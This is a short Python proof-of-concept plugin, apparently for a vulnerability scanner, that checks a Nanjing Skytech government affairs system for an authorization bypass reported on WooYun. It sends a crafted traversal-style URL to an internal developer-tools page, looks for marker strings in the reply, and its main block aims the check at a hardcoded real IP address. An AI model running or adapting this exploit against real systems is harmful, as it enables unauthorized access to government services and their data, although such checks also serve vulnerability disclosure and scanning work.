#!/usr/bin/env python
# -*- coding: utf-8 -*-
#南京擎天政务系统越权
#refer:http://www.wooyun.org/bugs/wooyun-2010-081902
#__author__ = 'xq17'

def assign(service, arg):
    if service == "skytech":
        return True, arg

def audit(arg):
    url = arg
    payload = 'inc/frame.htm?url0=../developer_tools/webresource_list_left_page.aspx'
    verify_url = url +  payload
    code, head, res, errcode, _ = curl.curl2(verify_url)
    if code == 200 and 'topbottom' in res and "linkpageIndex" in res:
        security_info(verify_url)
        security_info(url + payload)

if __name__ == '__main__':

    audit(assign('skytech','http://58.222.211.21/')[1])
